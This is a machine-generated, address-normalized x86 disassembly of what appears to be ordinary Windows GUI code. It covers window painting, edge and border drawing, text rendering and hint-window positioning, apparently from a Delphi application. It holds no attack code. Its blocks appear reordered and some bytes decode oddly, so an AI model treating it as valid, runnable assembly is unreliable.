mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4430c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_446e9d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_446ac4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_440c34
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_446edc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441ab8
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43f518
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_446f24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441cd8
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_446f54
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_446754
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_442c64
xor ecx ecx
push ebp
push sub_447083
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4430fc
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44708a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_442c6c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4430c0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44708a
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403368
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403368
jmp r-xdata
sub_447120
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440d98
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440d98
sub_447164
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_440d98
sub_4471d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_447264
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4474ca
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_42222c
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_432b54
call sub_432c34
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_432b54
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_433348
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_44750c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cd8
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43f6f4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_443cb8
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_440d98
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_441f5c
sub_447578
push ebx
push esi
mov esi edx
call sub_457570
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406c74
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_440d98
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406c74
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_440d98
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_4475dc
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_444080
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_447614
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44760c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_447654
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43ecb0
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43e78c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4476b0
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43ed88
test bl bl
jle r-xdata
xor eax eax
call sub_43cd80
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4476f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_422644
xor eax eax
push ebp
push sub_44778b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_422a70
xor eax eax
push ebp
push sub_447768
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44776f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_422a70
retn
sub_44779c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4480d4
mov edx 0x80ffff
mov eax esi
call sub_43fd50
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_4228ec
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_422314
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_447808
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_443258
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c1fc
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4431f0
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_447874
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4478ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4478d1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ReleaseDC
retn
sub_4478d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_447971
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_421a0c
mov eax ebx
call sub_441f04
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43fbb0
mov eax [ ebp - 0x14 ]
call sub_404400
push eax
mov eax [ ebx + 0x208 ]
call sub_4229f0
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447978
lea eax [ ebp - 0x14 ]
call sub_403f40
retn
sub_447980
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_4479ec
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_447a77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447a7e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43fbb0
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_42282c
mov edx eax
add edx 0x6
mov eax esi
call sub_43f36c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43fbb0
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_422848
mov edx eax
add edx 0x4
mov eax esi
call sub_43f390
sub_447a84
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_447c5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43fbe0
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_440e3c
mov eax [ esi ]
call sub_45dea0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45deac
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45dea0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45de94
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45deac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45de88
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45de94
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45de88
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_443b00
push 0x4
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447c64
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404200
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
